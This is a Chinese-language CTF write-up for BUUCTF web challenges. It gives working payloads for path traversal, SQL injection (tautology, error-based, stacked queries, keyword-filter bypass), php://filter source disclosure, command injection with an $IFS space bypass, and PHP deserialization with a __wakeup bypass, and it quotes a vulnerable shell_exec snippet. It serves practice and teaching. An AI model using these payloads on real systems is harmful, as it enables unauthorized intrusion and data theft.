# buuctf Web WP

##### WarmUp

​	![image-20210615085408294](../../../../../../../home/carrym/.config/Typora/typora-user-images/image-20210615085408294.png)

​	满足返回true 就行

​	==payload==

```
file=hint.php?../../../../../../../ffffllllaaaagggg
```



##### EasySQL

​	==payload==

```
1' or 1=1#
```



##### havefun

​	![image-20210615090018812](../../../../../../../home/carrym/.config/Typora/typora-user-images/image-20210615090018812.png)

​	==payload==

```
cat=dog
```



##### 随便注

```
1'or 1=1#注入成功
使用select  return  preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

使用报错注入
1' and extractvalue(1,concat('~',database()))#
爆出数据库名

堆叠注入查出表名
-1';use supersqli;show tables;#

用show查出字段名
拼接sql语句，绕过sql关键字检测得到flag
-1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#

Notes:
1、set 语句为已存在的变量赋值，PREPARE创建SQL语句，EXECUTE执行SQL语句。
2、sql中有一些保留字，当你的字段名是它的保留字时，这个时候sql语句的字段不加``就会报错。

https://blog.csdn.net/qq_43818615/article/details/104485484

```



##### EasySQL

​		堆叠注入

​	输入==1==返回==Array ( [0] => 1 )==

​	==1;show tables;#==返回==Array ( [0] => 1 ) Array ( [0] => Flag )==

关键的查询代码是 `select $post['query']||flag from Flag`

==payload==

```
`1;set sql_mode=PIPES_AS_CONCAT;select 1`
```

- 拼接一下就是 `select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag`
- 关于 `sql_mode` : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 `PIPES_AS_CONCAT` 将 `||` 视为字符串的连接操作符而非 "或" 运算符
- 还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 `||` 相当于是将 `select 1` 和 `select flag from flag` 的结果拼接在一起
- 关于==非预期解== 

```
*,1
```

- 拼接一下，不难理解 : `select *,1||flag from Flag`
- 等同于 `select *,1 from Flag`



##### Include

​		/?file=flag.php网页有利用点

尝试了那就是利用伪协议，文件名就是flag应该就在本文件源码里

所以用==php://filter用于读取源码==

==payload==

```
?file=php://filter/read=convert.base64-encode/resource=./flag.php
```



##### Secret File

​		审计源码，用颜色隐藏了一个页面

​		第二个页面超链接到action.php点开后却跳到end.php

​	抓包，发现关键页面

![image-20210617154522625](../../../../../../../home/carrym/.config/Typora/typora-user-images/image-20210617154522625.png)

伪协议filter就行



##### Exec

​		简单命令执行，堆叠注入

==payload==

```
127.0.0.1;ls ../../../../../
```

```
127.0.0.1;cat /flag
```



###### Ping Ping Ping

​		命令执行的空格绕过和特殊字符绕过，堆叠注入

关键代码↓

```
 $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

```

过滤了bash不能进行解码

尝试使用拼接绕过，过滤flag所以写成agfl

###### ① 空格过滤

空格可以用以下字符串代替：

> < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等

$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用
，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。

==payload==

```
?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php
```



###### PHP

​		php备份文件，尝试了php~和bak都不行

用字典爆破出www.zip

关键代码

![image-20210731100021160](../../../../../../../home/carrym/.config/Typora/typora-user-images/image-20210731100021160.png)

在反序列化时，当前属性个数大于实际属性个数时，就会跳过`__wakeup()`，去执行`__destruct`

?select=O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}

然后我们又意识到，这个变量时private

private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字

段名在序列化时，类名和字段名前面都会加上==\0==的前缀。字符串长度也包括所加前缀的长度



==payload==

```
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

